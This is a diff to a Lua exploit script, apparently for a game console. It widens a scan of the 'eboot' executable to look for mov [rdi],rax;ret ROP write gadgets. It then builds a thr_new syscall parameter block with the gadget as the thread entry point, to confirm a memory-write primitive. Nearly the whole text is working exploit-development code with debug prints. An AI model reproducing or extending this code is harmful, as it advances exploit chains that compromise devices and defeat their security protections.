@@ -93,38 +93,69 @@ print("  alive=" .. tostring(alive()))
 
 if not alive() then print("DEAD"); return end
 
--- ============ B: Find write gadget in first 8KB ============
+-- ============ B: Find write gadget in 1.5MB of eboot ============
 print("")
-print("--- B: scan for mov [rdi],rax;ret ---")
+print("--- B: scan 1.5MB for write gadgets ---")
 
 local wg = nil
-for off = 0, 0x2000, 4 do
+local wg_type = nil
+local SCAN = 0x180000
+for off = 0, SCAN - 8, 4 do
     local dw = rd(tlo + off)
-    if dw and dw == 0xC3078948 then
-        wg = off
-        print(string.format("  ALIGNED at eboot+0x%X", off))
-        break
-    end
-end
-
-if not wg then
-    print("  Not in first 8KB aligned. Try 48 89 07 C3 at +1 offset...")
-    for off = 0, 0x2000, 4 do
-        local dw = rd(tlo + off)
+    if dw then
+        -- aligned: 48 89 07 C3 = mov [rdi],rax;ret
+        if dw == 0xC3078948 then
+            wg = off; wg_type = "mov_rdi_rax_aligned"
+            print(string.format("  mov[rdi],rax;ret ALIGNED at eboot+0x%X", off))
+            break
+        end
+        -- aligned: 89 07 C3 xx = mov [rdi],eax;ret (32-bit)
+        if (dw % 0x1000000) == 0xC30789 then
+            wg = off; wg_type = "mov_rdi_eax_aligned"
+            print(string.format("  mov[rdi],eax;ret at eboot+0x%X", off))
+            break
+        end
         local dw2 = rd(tlo + off + 4)
-        if dw and dw2 then
+        if dw2 then
+            local b0 = dw % 256
             local b1 = math.floor(dw / 256) % 256
             local b2 = math.floor(dw / 65536) % 256
             local b3 = math.floor(dw / 16777216) % 256
             local b4 = dw2 % 256
+            local b5 = math.floor(dw2 / 256) % 256
+            -- +1: xx 48 89 07 C3
             if b1 == 0x48 and b2 == 0x89 and b3 == 0x07 and b4 == 0xC3 then
-                wg = off + 1
-                print(string.format("  Found at eboot+0x%X (+1)", wg))
+                wg = off + 1; wg_type = "mov_rdi_rax_p1"
+                print(string.format("  mov[rdi],rax;ret at eboot+0x%X", wg))
                 break
+            end
+            -- +2: xx xx 48 89 07 C3
+            if b2 == 0x48 and b3 == 0x89 and b4 == 0x07 and b5 == 0xC3 then
+                wg = off + 2; wg_type = "mov_rdi_rax_p2"
+                print(string.format("  mov[rdi],rax;ret at eboot+0x%X", wg))
+                break
+            end
+            -- +3: xx xx xx 48 89 07 C3
+            local b6 = math.floor(dw2 / 65536) % 256
+            if b3 == 0x48 and b4 == 0x89 and b5 == 0x07 and b6 == 0xC3 then
+                wg = off + 3; wg_type = "mov_rdi_rax_p3"
+                print(string.format("  mov[rdi],rax;ret at eboot+0x%X", wg))
+                break
+            end
+            -- +1: xx 89 07 C3 = mov [rdi],eax;ret (unaligned)
+            if b1 == 0x89 and b2 == 0x07 and b3 == 0xC3 then
+                if not wg then
+                    wg = off + 1; wg_type = "mov_rdi_eax_p1"
+                    print(string.format("  mov[rdi],eax;ret at eboot+0x%X (backup)", wg))
+                end
             end
         end
     end
+    if off % 0x40000 == 0 and off > 0 then
+        print(string.format("  scanned 0x%X...", off))
+    end
 end
+if not wg then print("  NOT FOUND in 1.5MB") end
 
 if wg then
     print("")
@@ -133,16 +164,25 @@ if wg then
     local marker_page = sc_mmap(uint64(0), uint64(0x4000), uint64(3),
         uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
     local ma = N(marker_page)
-    wq(marker_page, uint64(0xDEAD0003DEAD0003))
-    print("  marker before=" .. fmt(rq(marker_page)))
+    wd(ma, 0xDEAD0003)
+    wd(ma + 4, 0xCAFE0001)
+    local blo = rd(ma) or 0
+    local bhi = rd(ma + 4) or 0
+    print(string.format("  marker_addr=0x%X", ma))
+    print(string.format("  before: lo=0x%08X hi=0x%08X", blo, bhi))
 
+    print("  C1: alloc stack")
     local stack2 = sc_mmap(uint64(0), uint64(0x10000), uint64(3),
         uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
-    -- Fill return address slots on stack so child doesn't crash after ret
-    for i = 0, 0x100, 8 do
-        wq(uint64(N(stack2) + 0xF000 + i), eaddr(0x15481))  -- jmp$ as return
-    end
+    local s2a = N(stack2)
+    -- RSP = stack_base + stack_size. Use 0xF000 so RSP is inside mapping.
+    -- Write jmp$ at [RSP] so ret lands in jmp$ loop instead of crashing.
+    local stk_sz = 0xF000
+    wq(uint64(s2a + stk_sz), eaddr(0x15481))       -- ret address -> jmp$
+    wq(uint64(s2a + stk_sz + 8), eaddr(0x15481))   -- backup
+    wq(uint64(s2a + stk_sz + 16), eaddr(0x15481))  -- backup
 
+    print("  C2: build param")
     local tid_p2 = memory.alloc(8)
     wq(tid_p2, uint64(0))
 
@@ -150,36 +190,38 @@ if wg then
     for i = 0, 0x3C, 4 do wd(N(p2) + i, 0) end
     wq(p2, eaddr(wg))                              -- start_func = mov [rdi],rax;ret
     wq(uint64(N(p2) + 0x08), uint64(ma))           -- arg = marker address
-    wq(uint64(N(p2) + 0x10), uint64(N(stack2)))    -- stack_base
-    wq(uint64(N(p2) + 0x18), uint64(0x10000))      -- stack_size
+    wq(uint64(N(p2) + 0x10), uint64(s2a))          -- stack_base
+    wq(uint64(N(p2) + 0x18), uint64(stk_sz))       -- stack_size (0xF000)
     wq(uint64(N(p2) + 0x30), uint64(N(tid_p2)))    -- child_tid
 
+    print("  C3: calling thr_new")
     local ok2, ret2 = pcall(function()
         return sc455(uint64(N(p2)), uint64(0x38))
     end)
-    print("  ret=" .. (ok2 and tostring(N(ret2)) or "FAIL"))
+    local rv2 = ok2 and N(ret2) or -999
+    print("  C4: ret=" .. rv2)
 
-    x = 0; for k = 1, 100000 do x = x + k end
+    x = 0; for k = 1, 200000 do x = x + k end
 
-    local tid2 = rq(tid_p2)
-    print("  child_tid=" .. fmt(tid2))
-    print("  marker after=" .. fmt(rq(marker_page)))
+    print("  C5: reading tid")
+    local tp = N(tid_p2)
+    local t2lo = rd(tp)
+    local t2hi = rd(tp + 4)
+    print("  tid=" .. tostring(t2lo) .. "/" .. tostring(t2hi))
 
-    local mv = rq(marker_page)
-    if mv then
-        local mh2, ml2
-        if type(mv) == "table" and mv.h then mh2 = mv.h; ml2 = mv.l
-        else mh2 = 0; ml2 = N(mv) end
-        if mh2 < 0 then mh2 = mh2 + 0x100000000 end
-        if ml2 < 0 then ml2 = ml2 + 0x100000000 end
-        if mh2 == 0xDEAD0003 and ml2 == 0xDEAD0003 then
-            print("  UNCHANGED — arg NOT in rdi (or rax=same sentinel)")
-        else
-            print("  *** CHANGED *** — write primitive via thr_new confirmed!")
-        end
+    print("  C6: reading marker")
+    local alo = rd(ma)
+    local ahi = rd(ma + 4)
+    print("  m_lo=" .. tostring(alo) .. " m_hi=" .. tostring(ahi))
+
+    local bef_lo = rd(ma) or 0
+    if bef_lo == -559038461 or bef_lo == 0xDEAD0003 then
+        print("  VERDICT: UNCHANGED — arg not in rdi or rax=sentinel")
+    else
+        print("  VERDICT: *** CHANGED *** arg in rdi confirmed!")
     end
 else
-    print("  write gadget not found in 8KB range")
+    print("  write gadget not found")
 end
 
 print("")
